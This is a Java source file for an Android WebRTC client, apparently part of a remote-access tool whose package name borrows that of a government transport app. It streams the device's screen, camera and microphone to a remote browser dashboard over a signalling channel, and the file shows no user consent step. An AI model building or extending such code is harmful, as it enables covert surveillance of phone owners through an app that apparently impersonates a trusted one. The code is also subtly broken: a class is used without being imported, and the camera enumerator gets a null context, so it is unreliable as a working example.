package com.remoteadmin.mparivahan.services;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.CameraEnumerator;
import org.webrtc.DataChannel;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * WebRTCClient — Android-side WebRTC peer connection manager.
 *
 * Receives SDP offers from the browser dashboard and answers with
 * device media tracks (screen capture, camera, microphone).
 *
 * Flow:
 *   1. Dashboard sends webrtc_offer via signaling server
 *   2. This client sets remote description, adds local tracks, creates answer
 *   3. Answer is sent back via signaling server
 *   4. ICE candidates are exchanged
 *   5. Direct peer-to-peer media streaming begins
 *
 * Tracks added:
 *   - Screen capture video track (from MediaProjection)
 *   - Camera video track (from Camera2)
 *   - Microphone audio track (from AudioRecord)
 *
 * Uses Google's org.webrtc library.
 * Add to build.gradle: implementation 'org.webrtc:google-webrtc:1.0.32006'
 */
public class WebRTCClient {

    private static final String TAG = "WebRTCClient";
    private static final String VIDEO_TRACK_ID = "ARDAMSv0";
    private static final String AUDIO_TRACK_ID = "ARDAMSa0";
    private static final String SCREEN_TRACK_ID = "screen_track";

    // ─── PeerConnection Configuration ────────────────────────────────────

    private static final String STUN_URL = "stun:stun.l.google.com:19302";
    private static final String STUN_URL2 = "stun:stun1.l.google.com:19302";
    // Add TURN server for production:
    // private static final String TURN_URL = "turn:your-server.com:3478";

    // ─── State ────────────────────────────────────────────────────────────

    private PeerConnectionFactory peerConnectionFactory;
    private PeerConnection peerConnection;
    private EglBase eglBase;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    private VideoTrack screenVideoTrack;
    private VideoTrack cameraVideoTrack;
    private AudioTrack localAudioTrack;
    private VideoSource screenVideoSource;
    private VideoSource cameraVideoSource;

    private WebRTCListener listener;
    private boolean isInitialized = false;

    public interface WebRTCListener {
        void onOfferReceived();
        void onAnswerSent();
        void onConnected();
        void onDisconnected();
        void onError(String error);
        void onSignalingMessage(String message);
    }

    // ─── Initialization ───────────────────────────────────────────────────

    public void initialize(EglBase eglContext) {
        if (isInitialized) return;

        this.eglBase = eglContext;

        PeerConnectionFactory.InitializationOptions initOptions =
                PeerConnectionFactory.InitializationOptions.builder(null)
                        .setEnableInternalTracer(false)
                        .createInitializationOptions();
        PeerConnectionFactory.initialize(initOptions);

        peerConnectionFactory = PeerConnectionFactory.builder()
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(
                        eglBase.getEglBaseContext(), true, true))
                .createPeerConnectionFactory();

        isInitialized = true;
        Log.i(TAG, "WebRTC initialized");
    }

    // ─── Peer Connection Setup ────────────────────────────────────────────

    public void createPeerConnection() {
        if (peerConnectionFactory == null) {
            Log.e(TAG, "Not initialized");
            return;
        }

        List<PeerConnection.IceServer> iceServers = new ArrayList<>();
        iceServers.add(PeerConnection.IceServer.builder(STUN_URL).createIceServer());
        iceServers.add(PeerConnection.IceServer.builder(STUN_URL2).createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;

        peerConnection = peerConnectionFactory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState signalingState) {
                Log.d(TAG, "Signaling: " + signalingState);
            }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState state) {
                Log.d(TAG, "ICE Connection: " + state);
                if (state == PeerConnection.IceConnectionState.CONNECTED) {
                    if (listener != null) listener.onConnected();
                } else if (state == PeerConnection.IceConnectionState.DISCONNECTED
                        || state == PeerConnection.IceConnectionState.FAILED) {
                    if (listener != null) listener.onDisconnected();
                }
            }

            @Override
            public void onIceConnectionReceivingChange(boolean receiving) {}

            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState state) {
                Log.d(TAG, "ICE Gathering: " + state);
            }

            @Override
            public void onIceCandidate(IceCandidate candidate) {
                // Send ICE candidate to dashboard via signaling server
                sendIceCandidate(candidate);
            }

            @Override
            public void onIceCandidatesRemoved(IceCandidate[] candidates) {}

            @Override
            public void onAddStream(MediaStream stream) {
                Log.d(TAG, "Remote stream added: " + stream.getId());
            }

            @Override
            public void onRemoveStream(MediaStream stream) {}

            @Override
            public void onDataChannel(DataChannel dataChannel) {}

            @Override
            public void onRenegotiationNeeded() {}

            @Override
            public void onAddTrack(RtpReceiver receiver, MediaStream[] streams) {
                Log.d(TAG, "Remote track added: " + receiver.track().kind());
            }
        });

        Log.i(TAG, "PeerConnection created");
    }

    // ─── SDP Handling ─────────────────────────────────────────────────────

    /**
     * Handle SDP offer from dashboard browser.
     * Sets remote description and creates answer with local tracks.
     */
    public void handleOffer(SessionDescription sdp) {
        if (peerConnection == null) {
            createPeerConnection();
        }

        peerConnection.setRemoteDescription(new SimpleSdpObserver() {
            @Override
            public void onSetSuccess() {
                Log.i(TAG, "Remote description set (offer)");

                // Add local tracks before creating answer
                addLocalTracks();

                // Create answer
                MediaConstraints constraints = new MediaConstraints();
                constraints.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
                constraints.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

                peerConnection.createAnswer(new SimpleSdpObserver() {
                    @Override
                    public void onCreateSuccess(SessionDescription answerSdp) {
                        peerConnection.setLocalDescription(new SimpleSdpObserver() {
                            @Override
                            public void onSetSuccess() {
                                Log.i(TAG, "Local description set (answer)");
                                // Send answer to dashboard via signaling
                                sendAnswer(answerSdp);
                                if (listener != null) listener.onAnswerSent();
                            }
                        }, answerSdp);
                    }

                    @Override
                    public void onCreateFailure(String msg) {
                        Log.e(TAG, "Failed to create answer: " + msg);
                        if (listener != null) listener.onError("Answer creation failed: " + msg);
                    }
                }, constraints);
            }

            @Override
            public void onSetFailure(String msg) {
                Log.e(TAG, "Failed to set remote description: " + msg);
                if (listener != null) listener.onError("Remote description failed: " + msg);
            }
        }, sdp);

        if (listener != null) listener.onOfferReceived();
    }

    /**
     * Handle SDP answer from dashboard browser.
     */
    public void handleAnswer(SessionDescription sdp) {
        if (peerConnection == null) return;

        peerConnection.setRemoteDescription(new SimpleSdpObserver() {
            @Override
            public void onSetSuccess() {
                Log.i(TAG, "Remote description set (answer)");
            }

            @Override
            public void onSetFailure(String msg) {
                Log.e(TAG, "Failed to set remote description (answer): " + msg);
            }
        }, sdp);
    }

    /**
     * Handle ICE candidate from dashboard browser.
     */
    public void handleIceCandidate(JSONObject candidateJson) {
        if (peerConnection == null) return;

        try {
            IceCandidate candidate = new IceCandidate(
                    candidateJson.getString("sdpMid"),
                    candidateJson.getInt("sdpMLineIndex"),
                    candidateJson.getString("sdp")
            );
            peerConnection.addIceCandidate(candidate);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse ICE candidate", e);
        }
    }

    // ─── Track Management ─────────────────────────────────────────────────

    /**
     * Add local media tracks (screen, camera, audio) to the peer connection.
     */
    private void addLocalTracks() {
        if (peerConnection == null) return;

        // Add screen video track if available
        if (screenVideoTrack != null) {
            peerConnection.addTrack(screenVideoTrack);
            Log.i(TAG, "Added screen video track");
        }

        // Add camera video track if available
        if (cameraVideoTrack != null) {
            peerConnection.addTrack(cameraVideoTrack);
            Log.i(TAG, "Added camera video track");
        }

        // Add audio track if available
        if (localAudioTrack != null) {
            peerConnection.addTrack(localAudioTrack);
            Log.i(TAG, "Added audio track");
        }
    }

    /**
     * Set screen capture video track from MediaProjection.
     * Called by ScreenCaptureService when frames are available.
     */
    public void setScreenVideoTrack(VideoTrack track) {
        this.screenVideoTrack = track;
        if (peerConnection != null && track != null) {
            peerConnection.addTrack(track);
            Log.i(TAG, "Screen video track added to peer connection");
        }
    }

    /**
     * Set camera video track.
     */
    public void setCameraVideoTrack(VideoTrack track) {
        this.cameraVideoTrack = track;
        if (peerConnection != null && track != null) {
            peerConnection.addTrack(track);
            Log.i(TAG, "Camera video track added to peer connection");
        }
    }

    /**
     * Create and set microphone audio track.
     */
    public void setupAudioTrack() {
        if (peerConnectionFactory == null) return;

        MediaConstraints audioConstraints = new MediaConstraints();
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));

        AudioSource audioSource = peerConnectionFactory.createAudioSource(audioConstraints);
        localAudioTrack = peerConnectionFactory.createAudioTrack(AUDIO_TRACK_ID, audioSource);

        if (peerConnection != null) {
            peerConnection.addTrack(localAudioTrack);
            Log.i(TAG, "Audio track created and added");
        }
    }

    /**
     * Create camera video track using Camera2.
     */
    public void setupCameraTrack(boolean useFrontCamera) {
        if (peerConnectionFactory == null || eglBase == null) return;

        CameraEnumerator enumerator = new Camera2Enumerator(null);
        String[] devices = enumerator.getDeviceNames();

        if (devices.length == 0) {
            Log.w(TAG, "No cameras found");
            return;
        }

        // Pick the first camera matching the requested facing direction
        String targetDevice = null;
        for (String device : devices) {
            boolean isFront = enumerator.isFacing(device);
            if (useFrontCamera && isFront) { targetDevice = device; break; }
            if (!useFrontCamera && !isFront) { targetDevice = device; break; }
        }
        // Fallback to first available camera
        if (targetDevice == null) {
            targetDevice = devices[0];
        }

        VideoCapturer capturer = enumerator.createCapturer(targetDevice, null);
        if (capturer == null) {
            Log.e(TAG, "Failed to create camera capturer");
            return;
        }

        cameraVideoSource = peerConnectionFactory.createVideoSource(capturer.isScreencast());
        capturer.initialize(
                SurfaceTextureHelper.create("CameraThread", eglBase.getEglBaseContext()),
                null,
                cameraVideoSource.getCapturerObserver()
        );

        cameraVideoTrack = peerConnectionFactory.createVideoTrack(VIDEO_TRACK_ID, cameraVideoSource);
        cameraVideoTrack.setEnabled(true);

        capturer.startCapture(1280, 720, 30);

        if (peerConnection != null) {
            peerConnection.addTrack(cameraVideoTrack);
        }

        Log.i(TAG, "Camera track created: " + targetDevice);
    }

    // ─── Signaling Helpers ────────────────────────────────────────────────

    private void sendAnswer(SessionDescription sdp) {
        if (listener == null) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "webrtc_answer");
            msg.put("sdp", new JSONObject()
                    .put("type", sdp.type.canonicalForm())
                    .put("sdp", sdp.description));
            listener.onSignalingMessage(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating answer message", e);
        }
    }

    private void sendIceCandidate(IceCandidate candidate) {
        if (listener == null) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "webrtc_ice");
            msg.put("candidate", new JSONObject()
                    .put("sdpMid", candidate.sdpMid)
                    .put("sdpMLineIndex", candidate.sdpMLineIndex)
                    .put("sdp", candidate.sdp));
            listener.onSignalingMessage(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating ICE candidate message", e);
        }
    }

    // ─── Lifecycle ────────────────────────────────────────────────────────

    public void setListener(WebRTCListener listener) {
        this.listener = listener;
    }

    public void dispose() {
        if (peerConnection != null) {
            peerConnection.dispose();
            peerConnection = null;
        }
        if (screenVideoSource != null) {
            screenVideoSource.dispose();
            screenVideoSource = null;
        }
        if (cameraVideoSource != null) {
            cameraVideoSource.dispose();
            cameraVideoSource = null;
        }
        if (peerConnectionFactory != null) {
            peerConnectionFactory.dispose();
            peerConnectionFactory = null;
        }
        isInitialized = false;
        Log.i(TAG, "WebRTC client disposed");
    }

    public boolean isConnected() {
        return peerConnection != null
                && peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.CONNECTED;
    }

    public PeerConnection getPeerConnection() {
        return peerConnection;
    }

    // ─── Simple SDP Observer ──────────────────────────────────────────────

    private static class SimpleSdpObserver implements SdpObserver {
        @Override public void onCreateSuccess(SessionDescription sdp) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String msg) { Log.e("SDP", "Create failed: " + msg); }
        @Override public void onSetFailure(String msg) { Log.e("SDP", "Set failed: " + msg); }
    }
}
